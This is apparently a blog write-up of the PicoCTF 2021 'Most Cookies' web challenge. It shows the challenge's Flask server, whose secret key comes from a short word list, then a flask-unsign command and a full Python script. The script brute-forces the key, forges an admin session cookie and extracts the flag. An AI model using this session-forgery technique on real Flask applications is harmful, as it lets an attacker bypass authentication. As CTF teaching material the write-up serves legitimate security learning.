---
title: PicoCTF 2021 - Most Cookies
date: 2024-12-11 10:30:00 
categories: [CTF]
tags: [coding,flask,python,cookies] 
---

![figure](/assets/img/posts/8/1.png)

## Challenge Overview

This challenge falls under the **Web** category and, as the title suggests, is about manipulating cookies. The challenge description mentions **Flask sessions**, and we are provided with a backend source code file named `server.py`.

```python
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/reset")
def reset():
	resp = make_response(redirect("/"))
	session.pop("very_auth", None)
	return resp

@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

if __name__ == "__main__":
	app.run()

```

- **Difficulty**: Medium  
- **Objective**: The goal is to exploit the application to generate an admin cookie. Let's dive right into solving this challenge!

---

## Tools Used

- `flask-unsign`  
- `Python`  

---

## Solution

### 1. Solving the Challenge with `flask-unsign`

Using `flask-unsign`, solving this challenge is straightforward. We can extract the secrets, save them into a password list, and brute-force the secret key using the following command:

```bash
flask-unsign -u --server "http://mercury.picoctf.net:6259" --wordlist wordlist.txt
```

As shown in the figure below:  
![flask-unsign output](/assets/img/posts/8/2.png)

This method quickly provides the secret to craft a valid admin session token.

---

### 2. Solving the Challenge Manually with Python

While automation is convenient, I wanted to manually replicate the process to understand the underlying mechanisms better. This approach helped me face and solve issues like **infinite redirects** and **invalid cookies**.

Even though this challenge is old, I believe sharing knowledge is timeless, so here's my manual solution.

---

#### Understanding Flask Session Generation

To brute-force a cookie session, it’s crucial to understand how it is generated. After struggling to create a valid session, I examined the Flask source code, particularly the `sessions.py` file, which you can find [here](https://github.com/pallets/flask/blob/6b054f8f3876ff4c31580b014d344c4cf491059d/src/flask/sessions.py).

Scrolling down, I found the **`SecureCookieSessionInterface`** class at line 298, with a comment explaining:

> The default session interface that stores sessions in signed cookies through the `itsdangerous` module.

Key points for generating a signed cookie:
- It uses the **`itsdangerous`** library for securely signing data.  
- Default salt: `cookie-session`.  
- Digest method: `SHA-1`.  
- Authentication technique: `HMAC`.  
- Serializer: Flask `TaggedJSONSerializer` ( we can use json module instead).  

![SecureCookieSessionInterface snippet](/assets/img/posts/8/3.png)

It also uses **`URLSafeTimedSerializer`**, as described in the [itsdangerous documentation](https://itsdangerous.palletsprojects.com/en/stable/url_safe/):  
![URLSafeTimedSerializer snippet](/assets/img/posts/8/4.png)

---

#### Crafting a Valid Cookie

Based on this, I wrote a Python script to brute-force the session cookie manually. Here's the solution:

```python
#!/usr/bin/env python3

import re
import json
import hashlib
import requests
from itsdangerous import URLSafeTimedSerializer

url = 'http://mercury.picoctf.net:6259/display'
headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'}

wordlist = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

salt = 'cookie-session'
data = {'very_auth': 'admin'}

flag_pattern = r'picoCTF\{.*?\}'

# Brute-force secret key
for secret in wordlist:
    
    # session Configuration
    signer_kwargs = {'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
    serializer_instance = URLSafeTimedSerializer(secret_key=secret, salt=salt, signer_kwargs=signer_kwargs)
    token = serializer_instance.dumps(data)
    
    cookies = {'session': token}
    
    # Send request with token
    resp = requests.get(url, cookies=cookies, headers=headers, allow_redirects=False)
    flag = re.findall(flag_pattern, resp.text)
    
    if flag:
        print(f'[+] Secret found: {secret}')
        print(f'[+] Flag: {"".join(flag)}')
        break
```

---

## Lessons Learned

1. **Flask Sessions and Security**: Understanding how Flask sessions are signed is crucial to exploiting or securing applications that use them.  
2. **Manual vs Automated Approaches**: While tools like `flask-unsign` are quick, manually solving challenges deepens your knowledge and exposes you to hidden issues.  
3. **Reading Source Code**: Analyzing libraries like `itsdangerous` or Flask helps uncover details essential for crafting successful exploits.  

---

This writeup demonstrates the importance of balancing manual analysis with automation, and I hope it helps others understand Flask session handling better.
